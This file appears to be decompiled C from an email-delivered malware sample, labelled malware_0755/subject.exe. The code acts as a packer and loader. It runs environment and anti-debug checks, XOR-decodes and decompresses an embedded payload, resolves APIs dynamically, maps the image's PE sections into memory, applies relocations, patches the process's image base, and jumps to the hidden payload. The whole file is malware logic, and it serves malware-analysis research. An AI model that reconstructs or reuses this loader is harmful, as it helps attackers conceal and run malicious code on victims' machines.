// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0755/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401040(Eq_328 dwArg04, Eq_323 * dwArg08, Eq_328 dwArg0C)
{
	globals->dw406708 = 0x00000000;
	while (globals->dw406708 < dwArg0C)
	{
		dwArg04[globals->dw406708] = dwArg08[globals->dw406708];
		globals->dw406708 = globals->dw406708 + 0x00000001;
	}
	return;
}

void fn004010E0(word32 ebx, word32 esi, word32 edi, Eq_194 * fs)
{
	Eq_25 eax_18 = GetModuleHandleA(0x00000000);
	LoadIconA(0x00000000, 0x00007F00);
	GetWindowsDirectoryA(&fp->tFFFFFE9C, 0x0000012C);
	if ((word32) bLoc014B != 0x0000003A)
		int3();
	fp->tFFFFFE9C.u0 = 0x004065B4;
	lstrcatA(&fp->tFFFFFE9C, 0x0000012C);
	fp->tFFFFFE9C.u0 = 0x00000000;
	if (CreateFileA(&fp->tFFFFFE9C, 0x00000001, 0x00000003, 0x00000000, 0x00000003, 0x00000080, 0x0000012C) == 0xFFFFFFFF)
	{
l004012BE:
		return;
	}
	else
	{
		fp->tFFFFFE9C.u0 = 0x0000012C;
		Mem115[fp - 0x00000168:word32] = fp + 0xFFFFFEB4;
		GetWindowsDirectoryA(0x00000080, 0x00000000);
		if ((word32) bLoc014B != 0x0000003A)
			int3();
		fp->tFFFFFE9C.u0 = 0x004065BC;
		lstrcatA(&fp->tFFFFFE9C, 0x0000012C);
		fp->tFFFFFE9C.u0 = 0x00000000;
		Mem133[fp - 0x0000016C:word32] = 0x00000003;
		Mem135[fp - 0x00000170:word32] = 0x00000000;
		Mem137[fp - 0x00000174:word32] = 0x00000003;
		Mem139[fp - 0x00000178:word32] = 0x00000001;
		if (CreateFileA(&fp->tFFFFFE9C, 0x00000001, 0x00000003, 0x00000000, 0x00000003, 0x00000080, 0x0000012C) != 0xFFFFFFFF)
			goto l004012BE;
		else
		{
			Eq_25 eax_153 = globals->t402333;
			Eq_25 edx_156 = globals->t402337;
			Eq_25 dwLoc08_158 = 0x00000000;
			while (dwLoc08_158 <u eax_153)
			{
				fp->tFFFFFE9C.u0 = 0x00000000;
				GetModuleHandleA(0x00000000);
				dwLoc08_158.u0->dw0008 = dwLoc08_158.u0->dw0008 ^ 0x00000016;
				dwLoc08_158.u0 = dwLoc08_158.u0;
			}
			fp->tFFFFFE9C = edx_156;
			globals->t406718 = fn00401730(0x0000012C);
			fp->tFFFFFE9C = eax_153;
			fp->tFFFFFE9C = globals->t406718;
			Mem198[fp - 0x0000016C:word32] = 0x0040233B;
			fn004018F0(0x00000003, 0x00000080, 0x0000012C);
			globals->dw40670C = edi;
			globals->dw406704 = esi;
			globals->dw406714 = ebx;
			globals->ptr40671C = fs->ptr0018;
			globals->dw406710 = fp - 0x00000004;
			fp->tFFFFFE9C = eax_18;
			Eq_25 ecx_214 = 0x0040128F - eax_18;
			fp->tFFFFFE9C = ecx_214;
			fn00401760(0x00000080, 0x0000012C);
			Eq_25 edx_220 = globals->t406718;
			fp->tFFFFFE9C = edx_220;
			fn004012F0(fp - 0x00000004, 0x0000012C);
			Mem222[0x00406720:word32]();
			return;
		}
	}
}

word32 fn004012D0(Eq_328 dwArg04, Eq_323 * dwArg08)
{
	return GetProcAddress(dwArg04, dwArg08);
}

void fn004012F0(word32 ebp, word32 dwArg04)
{
	Eq_25 eax_9 = GetModuleHandleA(0x004065D4);
	lstrcpyA(fp + 0xFFFFFF44, 0x004065E4);
	code * eax_24 = GetProcAddress(eax_9, 0x004065F8);
	lstrcpyA(fp + 0xFFFFFF44, 0x00406608);
	GetProcAddress(eax_9, 0x0040661C);
	lstrcpyA(fp + 0xFFFFFF44, 0x0040662C);
	code * eax_54 = GetProcAddress(eax_9, 0x00406634);
	lstrcpyA(fp + 0xFFFFFF44, 0x00406648);
	code * eax_69 = GetProcAddress(eax_9, 0x0040665C);
	lstrcpyA(fp + 0xFFFFFF44, 0x0040666C);
	code * eax_84 = GetProcAddress(eax_9, 0x0040667C);
	lstrcpyA(fp + 0xFFFFFF44, 0x0040668C);
	GetProcAddress(eax_9, 0x004066A4);
	Eq_322 * edx_108 = dwArg04 + Mem0[dwArg04 + 0x0000003C:word32];
	Eq_328 eax_114 = &edx_108->w0014 + (word32) edx_108->w0014;
	Eq_336 * ebp_243 = fp - 0x00000004;
	eax_69();
	fn00401040(eax_114, dwArg04, dwArg04->dw003C + 0x00000138 + (word32) edx_108->w0006 *s 0x00000028);
	Eq_328 dwLoc30_115 = eax_114;
	up32 dwLoc10_147 = 0x00000000;
	while (dwLoc10_147 <u (word32) edx_108->w0006)
	{
		if (Mem0[dwLoc30_115 + 0x00000014:word32] != 0x00000000 && Mem0[dwLoc30_115 + 0x00000010:word32] != 0x00000000)
		{
			word32 eax_188 = Mem0[dwLoc30_115 + 0x00000010:word32] - 0x00000001 + Mem0[edx_108 + 0x0000003C:word32];
			fn00401040(eax_114 + Mem0[dwLoc30_115 + 0x0000000C:word32], dwArg04 + Mem0[dwLoc30_115 + 0x00000014:word32], SEQ(SEQ(0x00000000, eax_188) % Mem0[edx_108 + 0x0000003C:word32], eax_188) /u Mem0[edx_108 + 0x0000003C:word32] *s Mem0[edx_108 + 0x0000003C:word32]);
		}
		dwLoc30_115 = dwLoc30_115 + 0x00000028;
		dwLoc10_147 = dwLoc10_147 + 0x00000001;
	}
	word32 ecx_216 = eax_114 + Mem0[eax_114 + 0x0000003C:word32];
	word32 eax_222 = Mem0[ecx_216 + 0x00000050:word32];
	word32 * esp_231 = fp - 0x000000F4;
	eax_54();
	word32 dwLocCC_238 = eax_114 + Mem0[ecx_216 + 0x00000080:word32];
	while (dwLocCC_238->dw0010 != 0x00000000)
	{
		Eq_466 * dwLoc3C_269;
		Eq_467 * dwLoc2C_268;
		word32 edx_260 = eax_114 + Mem0[dwLocCC_238 + 0x0000000C:word32];
		esp_231 = esp_231 - 0x00000004;
		*esp_231 = edx_260;
		eax_84();
		if (dwLocCC_238->dw0000 != 0x00000000)
		{
			dwLoc2C_268 = eax_114 + Mem263[dwLocCC_238 + 0x00000000:word32];
			dwLoc3C_269 = eax_114 + Mem263[dwLocCC_238 + 0x00000010:word32];
		}
		else
		{
			dwLoc2C_268 = eax_114 + Mem263[dwLocCC_238 + 0x00000010:word32];
			dwLoc3C_269 = eax_114 + Mem263[dwLocCC_238 + 0x00000000:word32];
		}
		if (dwLocCC_238->dw0010 != 0x00000000 && dwLocCC_238->dw0000 != 0x00000000)
		{
			ebp_243->dwFFFFFFE8 = 0x00000001;
			goto l004015A8;
		}
l004015A8:
		while (dwLoc2C_268->dw0000 != 0x00000000)
		{
			if ((dwLoc2C_268->dw0000 & 0x80000000) != 0x00000000)
			{
				Eq_716 * esp_317 = esp_231 - 0x00000004;
				esp_317->dw0000 = dwLoc2C_268->dw0000 & 0x7FFFFFFF;
				esp_317->dw0004 = dwLocCC_238;
				dwLoc2C_268->dw0000 = fn004012D0(dwArg00, dwArg04);
				esp_231 = esp_317 + 0x00000004;
			}
			else
			{
				Eq_691 * esp_332 = esp_231 - 0x00000004;
				esp_332->dw0000 = dwLoc2C_268->dw0000 + 0x00000002 + eax_114;
				esp_332->dw0004 = dwLocCC_238;
				dwLoc2C_268->dw0000 = fn004012D0(dwArg00, dwArg04);
				esp_231 = esp_332 + 0x00000004;
			}
			if (0x00000000 != 0x00000000)
				dwLoc3C_269->dw0000 = dwLoc2C_268->dw0000;
			dwLoc2C_268 = dwLoc2C_268 + 1;
			dwLoc3C_269 = dwLoc3C_269 + 1;
		}
		dwLocCC_238 = dwLocCC_238 + 1;
	}
	word32 ecx_369 = Mem0[ecx_216 + 0x00000034:word32];
	Eq_433 * esp_370 = esp_231 - 0x00000004;
	esp_370->t0000 = ecx_369;
	esp_370->t0000.u0 = 0x00000000;
	esp_370->t0000.u0 = 0x00000000;
	esp_370->t0000.u0 = 0x00000000;
	esp_370->t0000.u0 = 0x00000022;
	Mem382[esp_370 - 0x00000014:word32] = eax_222;
	word32 esp_381 = esp_370 - 0x00000014;
	eax_24();
	globals->t406700 = ecx_216;
	if (globals->t406700 == 0x00000000)
	{
		Mem434[esp_370 - 0x00000018:word32] = Mem383[ecx_216 + 0x00000034:word32];
		word32 esp_436 = esp_370 - 0x00000014;
		if (UnmapViewOfFile(esp_370->t0000) == 0x00000000)
		{
			esp_370->t0000.u0 = 0x00008000;
			esp_370->t0000.u0 = 0x00000000;
			Mem485[esp_370 - 0x00000020:word32] = Mem481[ecx_216 + 0x00000034:word32];
			esp_436 = esp_370 - 0x00000014;
			if (VirtualFree(esp_370->t0000, esp_370->t0000, esp_370->t0000) == 0x00000000)
				;
			else
			{
l00401685:
				Eq_588 * esp_445 = esp_436 - 0x00000004;
				Mem446[esp_445 + 0x00000000:word32] = Mem434[ecx_216 + 0x00000034:word32];
				esp_445->t0000.u0 = 0x00000000;
				Mem450[esp_445 - 0x00000008:word32] = 0x00000000;
				esp_445->t0000.u0 = 0x00000000;
				esp_445->t0000.u0 = 0x00000022;
				Mem457[esp_445 - 0x00000014:word32] = eax_222;
				globals->t406700 = MapViewOfFileEx(esp_445->t0000, esp_445->t0000, esp_445->t0000, esp_445->t0000, esp_445->t0000, esp_445->t0000);
				esp_381 = &esp_445->t0000;
				if (globals->t406700 == 0x00000000)
				{
					esp_445->t0000.u0 = 0x00000040;
					esp_445->t0000.u0 = 0x00003000;
					Mem470[esp_445 - 0x00000008:word32] = Mem466[ecx_216 + 0x00000050:word32];
					Mem474[esp_445 - 0x0000000C:word32] = Mem470[ecx_216 + 0x00000034:word32];
					globals->t406700 = VirtualAlloc(esp_445->t0000, esp_445->t0000, esp_445->t0000, esp_445->t0000);
					esp_381 = &esp_445->t0000;
				}
l004016CC:
				Eq_518 * esp_401 = esp_381 - 0x00000004;
				esp_401->t0000 = eax_222;
				CloseHandle(esp_401->t0000);
				Mem408[esp_401 + 0x00000000:word32] = Mem402[ecx_216 + 0x00000050:word32];
				esp_401->t0000 = eax_114;
				esp_401->t0000 = globals->t406700;
				fn00401040(dwArg00, dwArg04, dwArg08);
				esp_401->t0000 = globals->t406700;
				fn004018C0(dwArg00);
				Mem426[0x00406720:word32] = Mem420[0x00406700:word32] + Mem420[ecx_216 + 0x00000028:word32];
				Mem429[ecx_216 + 0x00000028:word32] = Mem426[0x00406720:word32];
			}
		}
		else
			goto l00401685;
	}
	else
		goto l004016CC;
	return;
}

word32 fn00401730(word32 dwArg04)
{
	return VirtualAlloc(0x00000000, dwArg04, 0x00003000, 0x00000004);
}

void fn00401760(word32 dwArg04, word32 dwArg08)
{
fn00401760_entry:
l00401760:
	Eq_328 edx_16 = dwArg08 + Mem0[dwArg08 + 0x0000003C:word32]
	GetProcAddress(GetModuleHandleA(0x004066C0), 0x004066B0)()
	globals->t406700 = edx_16;
	branch globals->t406700 != 0x00000000 l004017BE
l004017B4:
	goto l004018B0
l004017BE:
	fn00401040(globals->t406700, dwArg08, Mem44[edx_16 + 0x00000050:word32])
	word32 eax_64 = globals->t406700 - dwArg08
	branch Mem44[edx_16 + 0x000000A4:word32] == 0x00000000 l004018A3
l004017F3:
	word32 dwLoc0C_157 = dwArg08 + Mem44[edx_16 + 0x000000A0:word32]
l00401802:
	branch dwLoc0C_157->dw0004 == 0x00000000 l004018A3
l0040180F:
	uint32 eax_105 = dwLoc0C_157->dw0004 - 0x00000008 >>u 0x00000001
	word16 * ecx_108[] = &dwLoc0C_157->a0008[0]
	uint32 dwLoc08_111 = 0x00000000
	goto l00401838
l0040182F:
	dwLoc08_111 = dwLoc08_111 + 0x00000001;
l00401838:
	branch dwLoc08_111 >=u eax_105 l00401892
l00401840:
	branch (word32) ecx_108[dwLoc08_111] >> 0x0000000C != 0x00000003 l00401890
l00401852:
	(Mem44[0x00406700:word32] + Mem44[dwLoc0C_157 + 0x00000000:word32])[(word32) ecx_108[dwLoc08_111] & 0x00000FFF] = (Mem44[0x00406700:word32] + Mem44[dwLoc0C_157 + 0x00000000:word32])[(word32) ecx_108[dwLoc08_111] & 0x00000FFF] + eax_64;
l00401890:
	goto l0040182F
l00401892:
	dwLoc0C_157 = dwLoc0C_157 + Mem44[dwLoc0C_157 + 0x00000004:word32];
	goto l00401802
l004018A3:
l004018B0:
	return
fn00401760_exit:
}

void fn004018C0(Eq_328 dwArg04)
{
	Eq_196 * edx_7 = globals->ptr40671C;
	edx_7->ptr0030->dw0008 = dwArg04;
	return;
}

void fn004018F0(word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	byte cl_12 = *dwArg04;
	lstrcpyA(fp + 0xFFFFFF6C, 0x004066DC);
	up32 dwLoc0C_118 = 0x00000001;
	word32 dwLoc18_124 = 0x00000000;
	do
	{
		up32 edx_40 = dwLoc0C_118 + 0x00000001;
		byte cl_37 = dwArg04[dwLoc0C_118];
		dwLoc0C_118 = edx_40;
		if ((word32) cl_37 != (word32) cl_12)
		{
			dwArg08[dwLoc18_124] = cl_37;
			dwLoc18_124 = dwLoc18_124 + 0x00000001;
		}
		else if ((word32) dwArg04[edx_40] == 0x00000000)
		{
			dwArg08[dwLoc18_124] = cl_12;
			dwLoc18_124 = dwLoc18_124 + 0x00000001;
			dwLoc0C_118 = edx_40 + 0x00000001;
		}
		else
		{
			word32 eax_104 = fn00401A10(fp - 0x00000010, dwArg04 + edx_40) + edx_40;
			dwLoc0C_118 = fn00401A10(fp - 0x00000020, dwArg04 + eax_104) + eax_104;
			up32 dwLoc1C_119 = 0x00000000;
			while (dwLoc1C_119 <u dwLoc10)
			{
				dwArg08[dwLoc18_124] = dwArg08[dwLoc18_124 - dwLoc20];
				dwLoc18_124 = dwLoc18_124 + 0x00000001;
				dwLoc1C_119 = dwLoc1C_119 + 0x00000001;
			}
		}
	} while (dwLoc0C_118 <u dwArg0C);
	return;
}

word32 fn00401A10(word32 dwArg04, word32 dwArg08)
{
	lstrcpyA(fp - 0x00000084, 0x004066D0);
	word32 dwLoc08_19 = 0x00000000;
	word32 dwLoc10_20 = 0x00000000;
	do
	{
		word32 edx_23 = (word32) dwArg08->b0000;
		word32 edx_33 = edx_23 & 0x0000007F | dwLoc08_19 << 0x00000007;
		word32 eax_36 = dwLoc10_20 + 0x00000001;
		dwArg08 = dwArg08 + 1;
		dwLoc08_19 = edx_33;
		dwLoc10_20 = eax_36;
	} while ((edx_23 & 0x00000080) != 0x00000000);
	*dwArg04 = edx_33;
	return eax_36;
}

